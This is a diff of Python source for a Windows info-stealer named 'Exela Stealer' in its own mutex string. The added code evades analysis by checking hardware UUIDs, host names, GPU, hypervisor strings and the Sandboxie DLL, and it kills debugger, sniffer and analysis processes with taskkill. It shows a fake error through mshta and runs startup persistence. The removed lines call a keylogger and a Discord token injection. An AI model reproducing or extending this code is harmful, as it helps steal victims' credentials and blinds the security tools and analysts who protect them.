+                                     "pestudio.exe", "vmwareuser.exe", "vgauthservice.exe", "vmacthlp.exe", "x96dbg.exe", "vmsrvc.exe", "x32dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "ksdumper.exe", "joeboxserver.exe"]
+        asyncio.run(self.calback())
+
+    async def calback(self):
+        await asyncio.gather(self.check_system(), self.kill_process())
+
+    async def check_system(self) -> None:
+        cmd = "wmic csproduct get uuid"
+        process = await asyncio.create_subprocess_shell(
+                cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                shell=True)
+        stdout, stderr = await process.communicate()
+        output_lines = stdout.decode(errors="ignore").split("\n")
+        get_uuid = output_lines[1].strip()
+        get_computer_name = os.getenv("computername")    
+        
+        for uuid in self.banned_uuids:
+            if uuid in get_uuid:
+                print("hwid detected")
+                os._exit(0)
+        
+        for compName in self.banned_computer_names:
+            if compName in get_computer_name:
+                print("computer name detected")
+                os._exit(0)
+
+    async def kill_process(self) -> None:
+        try:
+            process_list = await asyncio.create_subprocess_shell(
+                'tasklist',
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                shell=True
+            )
+            
+            stdout, _ = await process_list.communicate()
+            stdout = stdout.decode(errors="ignore")
+            for proc in self.banned_process:
+                if proc.lower() in stdout.lower():
+                    process_list = await asyncio.create_subprocess_shell(
+                    f'taskkill /F /IM "{proc}"',
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                    shell=True)
+
+                    await process_list.communicate()
+        except Exception as e:
+            print(f'Hata: {e}')
+
+class AntiVM:
+    async def Main(self) -> None:
+        taskk = [
+            asyncio.create_task(self.CheckGpu()),
+            asyncio.create_task(self.CheckHypervisor()),
+            asyncio.create_task(self.CheckHostName()),
+            asyncio.create_task(self.CheckDisk()),
+            asyncio.create_task(self.CheckDLL()),
+            asyncio.create_task(self.CheckGDB()),
+            asyncio.create_task(self.CheckProcess()),]
+        results = await asyncio.gather(*taskk)
+        if any(results):
+            print("Code running on a VM machine.")
+            try:
+                os._exit(0)
+            except:
+                try:
+                    sys.exit(0)
+                except:
+                    try:
+                        ctypes.windll.kernel32.ExitProcess(0)
+                    except:
+                        try:
+                            exit(0)
+                        except:
+                            pass
+        print("Code running on a normal machine.")
+    async def CheckGpu(self) -> bool:
+        try:
+            command_output = await asyncio.create_subprocess_shell(
+                'wmic path win32_VideoController get name',
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                shell=True)
+            stdout, stderr = await command_output.communicate()
+            decoded_output = stdout.decode(errors='ignore').splitlines()
+            return any(x.lower() in decoded_output[2].strip().lower() for x in ("virtualbox", "vmware"))
+        except:
+            return False
+    async def CheckHostName(self) -> bool:
         try:
             hostNames = ['sandbox','cuckoo', 'vm', 'virtual', 'qemu', 'vbox', 'xen']
             hostname = platform.node().lower()
@@ -1201,7 +2001,31 @@ class HardAntiVM:
             return False
         except:
             return False
-    def check_processes(self):
+    async def CheckDisk(self) -> bool:
+        try:
+            return any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
+        except:
+            return False
+    async def CheckDLL(self) -> bool:
+        try:
+            handle = ctypes.windll.LoadLibrary("SbieDll.dll")
+        except:
+            return False
+        else:
+            return True
+    async def CheckGDB(self) -> bool:
+        try:
+            process = await asyncio.create_subprocess_shell(
+                "gdb --version",
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                shell=True)
+            stdout, stderr = await process.communicate()
+            if b"GDB" in stdout:
+                return True
+        except:
+            return False
+    async def CheckProcess(self) -> bool:
         try:
             banned_processes = [
             "vmtoolsd.exe",     # VMware
@@ -1213,162 +2037,65 @@ class HardAntiVM:
             "prl_tools.exe",    # Parallels
             "xenservice.exe",   # Xen
                             ]           
-            for process in psutil.process_iter(['name']):
-                if process.info['name'].lower() in banned_processes:
+            process = await asyncio.create_subprocess_shell("tasklist",stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
+            stdout, stderr = await process.communicate()
+            result = stdout.decode().lower()
+            for process in banned_processes:
+                if process in result:
                     return True
             return False
         except:
             return False
-    def check_files(self):
+    async def CheckHypervisor(self) -> bool:
         try:
-            banned_files = [
-                "\\Device\\Harddisk0\\DR0",     # VMware
-                "\\Device\\Harddisk0\\DR1",     # VirtualBox
-                "\\Device\\Harddisk0\\DR2",     # Parallels
-                "\\Device\\Harddisk0\\DR3",     # Xen
-                ]      
-            for file in banned_files:
-                if os.path.exists(file):
-                    return True
-            return False 
-        except:
-            return False
-    def check_gdb(self):
-        try:
-            output = subprocess.check_output(["gdb", "--version"], shell=True, timeout=5)
-            if b"GDB" in output:
-                return True
-        except:
-            pass
-        return False
-    def check_hypervisor(self):
-        try:
-            output = subprocess.check_output(["systeminfo"], stderr=subprocess.STDOUT, shell=True)
-            output2 = subprocess.check_output('wmic computersystem get Manufacturer', shell=True, stderr=subprocess.STDOUT)
-            output3 = subprocess.check_output('wmic path Win32_ComputerSystem get Manufacturer', shell=True, stderr=subprocess.STDOUT).decode().lower()
-            if b"Hypervisor" in output:
-                return True
-            elif b'VMware' in output2:
-                return True
-            elif "vmware" in output3:
-                return True
-        except:
-            return False
-    def normalVM(self):
-        try:
-            banned_bios_manufacturers = [
-                "VMware",
-                "VirtualBox",
-                "Xen",
-            ]
-            bios_manufacturer = self.get_bios_manufacturer()
-            if bios_manufacturer:
-                for manufacturer in banned_bios_manufacturers:
-                    if manufacturer.lower() in bios_manufacturer.lower():
-                        return True
+            output = await asyncio.create_subprocess_shell(
+                'wmic computersystem get Manufacturer',
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                shell=True
+            )
+            stdout, stderr = await output.communicate()
 
-            return False
-        except:
-            return False
-    def get_bios_manufacturer(self):
-        try:
-            c = wmi.WMI()
-            bios = c.Win32_BIOS()[0]
-            return bios.Manufacturer
-        except:
-            return ""
-    def sandboxie(self):
-        try:
-            handle = ctypes.windll.LoadLibrary("SbieDll.dll")
-        except:
-            return False
-        else:
-            return True
-    def vmcik(self):
-        try:
-            objWmi = wmi.WMI()
-            for diskDrive in objWmi.query("Select * from Win32_DiskDrive"):
-                if "vbox" in diskDrive.Caption.lower() or "virtual" in diskDrive.Caption.lower():
-                    return True
-                else:
-                    return False   
-        except:
-            return False             
-class AntiDebug:
-    def __init__(self) -> None:
-        self.banned_uuids = ["7AB5C494-39F5-4941-9163-47F54D6D5016","129B5E6B-E368-45D4-80AB-D4F106495924","8F384129-F079-456E-AE35-16608E317F4F","E6833342-780F-56A2-6F92-77DACC2EF8B3", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "71DC2242-6EA2-C40B-0798-B4F5B4CC8776", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-AC1F6BD04C9E", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
-                            "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4"]
-        self.banned_computer_names = ["WDAGUtilityAccount","JOANNA","WINZDS-21T43RNG", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
-                            "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC",
-                            "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R","COMPNAME_4491", "WILEYPC", "WORK","KATHLROGE","DESKTOP-TKGQ6GH", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC","DESKTOP-NNSJYNR", "JULIA-PC","DESKTOP-BQISITB", "d1bnJkfVlH"]
-        self.banned_process = ["httpdebuggerui","node","wireshark", "fiddler", "regedit", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg",
-                                     "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
-        self.calback()
-    def calback(self):
-        self.check_system()
-        self.kill_process()
-    def check_system(self):
-        get_uuid = str(subprocess.check_output("wmic csproduct get uuid", shell=True).decode('utf-8').split("\n")[1].strip())
-        get_computer_name = os.getenv("computername")    
-        for uuid in self.banned_uuids:
-            if uuid in get_uuid:
-                print("hwid detected")
-                os._exit(0)
-        for compName in self.banned_computer_names:
-            if compName in get_computer_name:
-                print("computer name detected")
-                os._exit(0)
-    def kill_process(self):
-        for proc in psutil.process_iter():
-            if any(procstr in proc.name().lower() for procstr in self.banned_process):
-                try:
-                    proc.kill()
-                except:
-                    pass   
-def injectKeyloggers():
-    if injectKeylogger:
-        try:
-            path = os.getenv('temp')
-            outputFile = path + "\\key_logs.txt"
-            if os.path.isfile(outputFile):
-                os.remove(outputFile)
-            logger = KeyboardLogger(outputFile, UrLxD)
-            logger.start_logging()
-        except Exception as e:
-            print(str(e))
-def inject_dc():
-    if inject_discord:
-            DiscordInjection()
+            output2 = await asyncio.create_subprocess_shell(
+                'wmic path Win32_ComputerSystem get Manufacturer',
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                shell=True
+            )
+            stdout2, stderr2 = await output2.communicate()
 
-def MakeError():
+            
+            if b'VMware' in stdout:
+                return True
+            elif b"vmware" in stdout2.lower():
+                return True
+        except:
+            return False
+
+async def Fakerror() -> None:
     try:
         if FakeError[0] and not os.path.abspath(sys.argv[0]) == os.path.join(os.getenv("LOCALAPPDATA"), "ExelaUpdateService", "Exela.exe"):
             title = FakeError[1][0].replace("\x22", "\\x22").replace("\x27", "\\x22") # Sets the title of the fake error
             message = FakeError[1][1].replace("\x22", "\\x22").replace("\x27", "\\x22") # Sets the message of the fake error
             cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, FakeError[1][2])
-            subprocess.Popen(cmd, shell=True)
-    except:
-        pass
+            await asyncio.create_subprocess_shell(cmd, shell=True) 
+    except:pass
 
-def callAllFunctions():
-    try:
-        AntiDebug()
-        if not Anti_Vm:
-            thread = threading.Thread(target=QuicaxdExela,daemon=True)
-            thread.start()
-            thread.join()
+if __name__ == '__main__':
+    if os.name == "nt":
+        if not create_mutex("Exela | Stealar | on top |"):
+            print("mutex already exist")
+            os._exit(0)
         else:
-            HardAntiVM()
-        inject_dc()
-        injectKeyloggers()
-    except:
-        pass
-if __name__ == "__main__":
-    if not create_mutex("Exela | Stealer | on | Top"):
-        print("mutex already exist")
-        os._exit(0)
+            start_time = time.time()
+            if Anti_VM:
+                asyncio.run(AntiVM().Main())
+            AntiDebug()
+            if not startup_method == "no-startup":
+                asyncio.run(Startup().main())
+            asyncio.run(Fakerror())
+            main_instance = Main()
+            asyncio.run(main_instance.main())
+            print( time.time() - start_time )
     else:
-        t = time.time()
-        MakeError()
-        callAllFunctions()
-        print(time.time() - t)
+        print("just Windows Operating system's supported by Exela")
